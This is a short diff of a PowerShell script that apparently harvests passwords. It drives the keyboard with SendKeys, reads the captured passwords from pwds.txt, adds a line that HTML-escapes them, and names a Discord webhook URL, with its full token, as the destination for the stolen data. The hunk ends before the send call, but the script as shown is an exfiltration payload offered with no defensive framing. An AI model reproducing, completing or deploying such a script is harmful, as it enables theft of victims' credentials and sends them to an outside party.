@@ -11,6 +11,7 @@ $wshell.SendKeys("~")
 Sleep 2
 
 $PassContent = Get-Content pwds.txt -Raw
+$PassContent = $PassContent -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;'
 
 $URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
 
